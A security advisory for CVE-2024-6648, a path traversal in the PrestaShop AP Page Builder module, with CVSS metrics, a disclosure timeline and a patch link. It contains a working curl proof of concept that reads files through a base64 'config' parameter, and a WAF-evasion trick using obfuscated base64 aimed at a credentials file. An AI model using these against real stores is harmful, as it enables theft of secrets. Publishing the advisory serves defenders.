---
layout: post
title: "[CVE-2024-6648] Absolute Path Traversal vulnerability in AP Page Builder versions prior to 4.0.0"
categories: core
author:
- n0d0n
- incibe.es
meta: "CVE,PrestaShop,Addon,Theme,appagebuilder"
severity: "high (8.7)"
---

Ap Page Builder is vulnerable to an absolute path traversal that allows the attacker to include system files by modifying the base64 config param submitted to apajax.php

## Summary

* **CVE ID**: [CVE-2024-6648](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-6648)
* **Published at**: 2025-05-08
* **Advisory source**: Incibe cert
* **Platform**: PrestaShop
* **Product**: Ap Page Builder
* **Impacted release**: < 4.0.0
* **Product author**: Apollo Theme
* **Weakness**: [CWE-36](https://cwe.mitre.org/data/definitions/36.html)
* **Severity**: high (8.7)

## Description

Absolute Path Traversal vulnerability in AP Page Builder versions prior to 4.0.0 could allow an unauthenticated remote user to modify the 'product_item_path' within the 'config' JSON file, allowing them to read any file on the system.

**WARNING** : This exploit uses a Base64 payload, which may bypass most WAFs.

Be aware that it's possible to obfuscate a Base64 string using special characters to evade detection - the base64_decode() function in PHP will silently strip them out.

For example, the following is a perfectly valid Base64 input for base64_decode:
Li4$vLi4-vY#XBwL--2NvbmZpZy9wYXJhb-WV0Z$XJzLnB$ocA==

If you're using ModSecurity 2, prefer base64DecodeExt over base64Decode to mitigate this technique.

## CVSS base metrics

* **Attack Vector (AV)**: Network
* **Attack Complexity (AC)**: Low
* **Attack Requirements (AT)**: None
* **Privileges Required (PR)**: None
* **User Interaction (UI)**: None
* **Confidentiality (VC)**: High
* **Integrity (VI)**: None
* **Availability (VA)**: None

**Vector string**: [CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N](https://nvd.nist.gov/vuln-metrics/cvss/v4-calculator?vector=AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N)

## Proof of concept

POC has been published by n0d0n : https://github.com/n0d0n/CVE-2024-6648/blob/main/CVE-2024-6648.yaml

```bash
curl -v "https://preprod.X/modules/appagebuilder/apajax.php?config=eyJvcmRlcl9ieSI6ImlkX3Byb2R1Y3QiLCJuYl9wcm9kdWN0cyI6IjIiLCJ0b3RhbF9wYWdlIjoxLCAicHJvZHVjdF9pdGVtX3BhdGgiOiAiY29uZmlnLnhtbCIsICJjb2x1bW5zIjogMX0%3d&p=1"
```

## Patch

See this : [Help Center - PrestaShop](https://help-center.prestashop.com/hc/en-us/articles/25492821315346-Ap-Page-Builder-module-compliance)

## Timeline

| Date | Action |
| -- | -- |
| 2024-07-15 | Incibe report the vulnerability |
| 2024-08-16 | Due to the severity of the vulnerability, the large number of affected themes (over 2,000) across multiple marketplaces, and the time required for the module author to patch all of them, TouchWeb requests a one-year delay before public disclosure. |
| 2024-10-16 | Incibe accept a 9 months delay |
| 2025-05-08 | Incibe publish the vulnerability |
| 2025-05-08 | n0d0n publish the POC |



## Links

* [Incibe cert advisory](https://www.incibe.es/incibe-cert/alerta-temprana/avisos/path-traversal-en-ap-page-builder)
* [Prestashop advisory](https://help-center.prestashop.com/hc/fr/articles/25492821315346-Mise-en-conformit%C3%A9-du-module-Ap-Page-Builder)
* [Theme page](https://apollotheme.com/products/ap-pagebuilder-prestashop-module)
* [Public POC](https://github.com/n0d0n/CVE-2024-6648/blob/main/CVE-2024-6648.yaml)
